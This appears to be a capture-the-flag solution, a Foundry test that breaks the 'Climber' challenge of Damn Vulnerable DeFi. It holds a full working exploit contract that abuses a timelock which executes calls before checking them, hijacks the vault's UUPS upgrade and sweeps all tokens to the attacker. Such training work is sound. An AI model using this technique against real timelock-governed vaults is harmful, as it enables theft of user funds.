// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {Initializable} from "openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Attacker is Initializable, OwnableUpgradeable, UUPSUpgradeable  {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    address public myOwner;
    address public climberTimelock;
    address public climberVaultProxy; 
    address public climberVault;
    address public attackerImplementation;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 public fixedSalt; 
    
    constructor() initializer {}

    function initialize (address _climberTimelock, address _climberVaultProxy, address _climberVault, address _myOwner, address _attackerImplementation) external initializer {
        
        // Initialize inheritance chain
        __UUPSUpgradeable_init();
        __Ownable_init();

        climberTimelock = _climberTimelock;
        climberVaultProxy = _climberVaultProxy;
        climberVault = _climberVault;
        myOwner = _myOwner;
        _sweeper = myOwner;
        attackerImplementation = _attackerImplementation;

        fixedSalt = bytes32(abi.encodePacked(""));
    }

    function getProposerRole() public {
        // See explanation lower in the file

        bytes32 ADMIN_ROLE = keccak256("ADMIN_ROLE");
        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

        targets.push(climberTimelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        targets.push(climberTimelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        climberTimelock.call(abi.encodeWithSignature("execute(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, fixedSalt));
    }

    function schedule() public {
        climberTimelock.call(abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", targets, values, dataElements, fixedSalt));
    }

    function changeImplementation() public {
        address[] memory targets2 = new address[](1);
        uint256[] memory values2 = new uint256[](1);
        bytes[] memory dataElements2 = new bytes[](1);

        targets2[0] = address(climberVaultProxy);
        values2[0] = 0;
        dataElements2[0] = abi.encodeWithSignature("upgradeTo(address)", address(attackerImplementation));

        climberTimelock.call(abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", targets2, values2, dataElements2, fixedSalt));
        climberTimelock.call(abi.encodeWithSignature("execute(address[],uint256[],bytes[],bytes32)", targets2, values2, dataElements2, fixedSalt));
    }

    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }

    function _authorizeUpgrade(address newImplementation)
        internal
        override
        {assert(msg.sender == myOwner);}
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);

        // In the timeLock, we check that the operation is in a certain state and has been proposed only 
        // at the end, meaning that we can execute arbitrary things before checking if they've been proposed.
        // Also, the check that we are after a certain block is the other way.
        // The contract has admin role on itself, meaning that we can use execute() to change the proposer role to itself, and then propose this change with its new credentials
        // We need to write another contract on which to rebound because the calldata to the schedule function can not include itself
        
        Attacker myAttacker = new Attacker();
        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address,address,address)",
            climberTimelock, climberVaultProxy, climberImplementation, attacker, address(myAttacker));
            
        ERC1967Proxy attackerProxy = new ERC1967Proxy(
            address(myAttacker),
            data
        );
        address(attackerProxy).call(abi.encodeWithSignature("getProposerRole()"));
        address(attackerProxy).call(abi.encodeWithSignature("changeImplementation()"));

        address(climberVaultProxy).call(abi.encodeWithSignature("sweepFunds(address)", address(dvt)));
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
